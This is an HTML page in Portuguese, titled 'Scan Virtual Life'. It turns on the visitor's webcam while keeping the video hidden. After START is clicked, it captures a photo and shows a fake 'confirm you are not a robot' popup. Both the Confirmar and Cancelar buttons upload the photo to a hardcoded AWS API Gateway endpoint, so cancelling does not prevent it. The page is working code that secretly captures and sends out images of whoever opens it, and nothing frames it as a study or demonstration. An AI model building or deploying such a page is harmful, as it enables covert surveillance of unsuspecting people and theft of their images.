<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Scan Virtual Life</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #f0f0f0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    h1 {
      color: #333;
      font-size: clamp(1.5em, 5vw, 2.5em);
      margin-bottom: 30px;
      padding: 0 10px;
    }

    button {
      padding: 12px 24px;
      margin: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      transition: all 0.3s ease;
      width: 200px;
      max-width: 90%;
    }

    #captureBtn {
      background-color: #4CAF50;
      color: white;
    }

    #captureBtn:hover {
      background-color: #45a049;
    }

    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
      z-index: 1000;
      width: 90%;
      max-width: 400px;
    }

    .popup h2 {
      font-size: clamp(1.2em, 4vw, 1.5em);
      margin-bottom: 15px;
    }

    .popup p {
      font-size: clamp(0.9em, 3vw, 1.1em);
      margin-bottom: 20px;
    }

    .popup-buttons {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .confirm-btn, .cancel-btn {
      width: 100%;
      padding: 15px;
      font-size: 16px;
    }

    .confirm-btn {
      background-color: #4CAF50;
      color: white;
    }

    .cancel-btn {
      background-color: #f44336;
      color: white;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
      z-index: 999;
    }

    @media (max-width: 480px) {
      body {
        padding: 10px;
      }

      button {
        padding: 15px 20px;
        font-size: 14px;
      }

      .popup {
        padding: 15px;
      }
    }
  </style>
</head>
<body>
  <h1>SCAN VIRTUAL LIFE</h1>
  <video id="video" width="320" height="240" autoplay style="display: none;"></video><br>
  <button id="captureBtn">START</button>
  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>

  <div class="overlay" id="overlay"></div>
  <div class="popup" id="popup">
    <h2>Confirme se você não é um robô</h2>
    <p>Clique no botão verde para continuar</p>
    <div class="popup-buttons">
      <button class="confirm-btn" id="confirmBtn">Confirmar</button>
      <button class="cancel-btn" id="cancelBtn">Cancelar</button>
    </div>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let imageBlob = null;
    const popup = document.getElementById('popup');
    const overlay = document.getElementById('overlay');

    // Ativa a câmera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => video.srcObject = stream)
      .catch(err => alert(err));

    // Captura imagem ao clicar em START
    document.getElementById('captureBtn').onclick = () => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        imageBlob = blob;
        popup.style.display = 'block';
        overlay.style.display = 'block';
      }, 'image/jpeg');
    };

    // Função para fazer o upload
    async function fazerUpload() {
      if (!imageBlob) return alert("Erro.");

      const filename = `foto-${Date.now()}.jpg`;

      const res = await fetch(`https://d59rrhlltg.execute-api.sa-east-1.amazonaws.com/get-upload-url?filename=${filename}`);
      const data = await res.json();

      const uploadRes = await fetch(data.url, {
        method: 'PUT',
        headers: { 'Content-Type': 'image/jpeg' },
        body: imageBlob
      });
    }

    // Botão verde (confirmar)
    document.getElementById('confirmBtn').onclick = () => {
      popup.style.display = 'none';
      overlay.style.display = 'none';
      fazerUpload();
    };

    // Botão vermelho (cancelar)
    document.getElementById('cancelBtn').onclick = () => {
      popup.style.display = 'none';
      overlay.style.display = 'none';
      fazerUpload();
    };
  </script>
</body>
</html>
